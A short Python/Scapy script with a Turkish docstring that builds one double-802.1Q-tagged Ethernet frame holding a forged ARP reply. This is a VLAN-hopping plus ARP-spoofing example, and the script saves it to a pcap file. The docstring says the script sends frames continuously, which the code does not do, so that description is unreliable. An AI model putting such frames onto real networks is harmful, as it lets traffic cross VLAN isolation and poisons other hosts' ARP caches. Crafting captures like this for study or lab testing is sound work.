"""Çift 802.1Q etiketi taşıyan ve içinde sahte ARP cevabı bulunan Ethernet çerçevelerini sürekli göndermeye çalışan VLAN hopping örneğidir.

Bu kod:
- DTP paketi üretmez.
- DTP trunk görüşmesi yapmaz.
- DTP abusing gerçekleştirmez.
- Double tagging ve ARP spoofing fikirlerini birleştirir.
- Sürekli paket gönderdiği için gerçek ağda kullanılmamalıdır. """

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.layers.l2 import ARP, Ether, Dot1Q
from scapy.all import wrpcap


output_file = "double_tagged_vlan_example.pcap"

outer_vlan = 10
inner_vlan = 20

example_packet = (
    Ether(
        src="02:00:00:00:00:10",
        dst="ff:ff:ff:ff:ff:ff"
    )
    / Dot1Q(
        vlan=outer_vlan
    )
    / Dot1Q(
        vlan=inner_vlan
    )
    / ARP(
        op=2,
        hwsrc="02:00:00:00:00:10",
        psrc="192.168.20.1",
        hwdst="00:00:00:00:00:00",
        pdst="192.168.20.50"
    )
)

wrpcap(
    output_file,
    [example_packet]
)

print(f"[BİLGİ] Örnek PCAP oluşturuldu: {output_file}")
print(f"[BİLGİ] Dış VLAN etiketi : {outer_vlan}")
print(f"[BİLGİ] İç VLAN etiketi  : {inner_vlan}")
print("[BİLGİ] Ağ arayüzünden hiçbir paket gönderilmedi.")